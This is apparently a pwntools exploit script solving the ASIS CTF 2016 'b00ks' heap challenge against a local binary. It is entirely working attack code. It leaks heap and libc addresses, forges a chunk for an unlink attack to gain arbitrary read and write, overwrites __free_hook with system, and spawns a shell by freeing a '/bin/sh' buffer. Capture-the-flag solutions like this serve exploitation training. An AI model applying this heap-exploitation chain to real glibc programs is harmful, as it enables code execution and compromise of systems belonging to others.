from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
p = process('./data/bin/heap23_27_Asis_2016_b00ks')
elf = ELF('./data/bin/heap23_27_Asis_2016_b00ks')
libc = elf.libc

def cmd(choice):
    p.recvuntil(b'> ')
    p.sendline(str(choice))

def create(book_size, book_name, desc_size, desc):
    cmd(1)
    p.recvuntil(b': ')
    p.sendline(str(book_size))
    p.recvuntil(b': ')
    if len(book_name) == book_size:
        p.send(book_name)
    else:
        p.sendline(book_name)
    p.recvuntil(b': ')
    p.sendline(str(desc_size))
    p.recvuntil(b': ')
    if len(desc) == desc_size:
        p.send(desc)
    else:
        p.sendline(desc)

def remove(idx):
    cmd(2)
    p.recvuntil(b': ')
    p.sendline(str(idx))

def edit(idx, desc):
    cmd(3)
    p.recvuntil(b': ')
    p.sendline(str(idx))
    p.recvuntil(b': ')
    p.send(desc)

def author_name(author):
    cmd(5)
    p.recvuntil(b': ')
    p.send(author)

def write_to(addr, content, size):
    edit(4, p64(addr) + p64(size + 0x100) + b'\n')
    edit(6, content + b'\n')

def read_at(addr):
    edit(4, p64(addr) + b'\n')
    cmd(4)
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    p.recvuntil('Description: ')
    content = p.recvline()[:-1]
    p.info(content)
    return content

p.recvuntil(b'name: ');p.sendline(b'x' * (0x20 - 5) + b'leak:');create(0x20, b'tmp a', 0x20, b'b')#step.1
cmd(4);p.recvuntil(b'Author: ');p.recvuntil(b'leak:');heap_leak = u64(p.recvline().strip().ljust(8, b'\x00'));heap_base = heap_leak - 0x1080#step.2
create(0x20, b'buf 1', 0x20, b'desc buf');create(0x20, b'buf 2', 0x20, b'desc buf 2')#step.3
remove(2);remove(3)#step.4
create(0x20, b'name', 0x108, b'overflow');create(0x20, b'name', 0x100 - 0x10, b'target') #step.5
create(0x20, b'/bin/sh\x00', 0x200, b'to arbitrary read write') #step.6
ptr = heap_base + 0x1180;payload = p64(0) + p64(0x101) + p64(ptr - 0x18) + p64(ptr - 0x10) + b'\x00' * 0xe0 + p64(0x100);edit(4, payload)#step.7
remove(5)#step.8
edit(4, p64(0x30) + p64(4) + p64(heap_base + 0x11a0) + p64(heap_base + 0x10c0) + b'\n')#step.9
libc_leak = u64(read_at(heap_base + 0x11e0).ljust(8, b'\x00')) - (libc.sym['__malloc_hook'] + 0x10 + 0x58);libc.address = libc_leak#step.10
write_to(libc.sym['__free_hook'], p64(libc.sym['system']), 0x10)#step.11
remove(6)#step.12
p.interactive()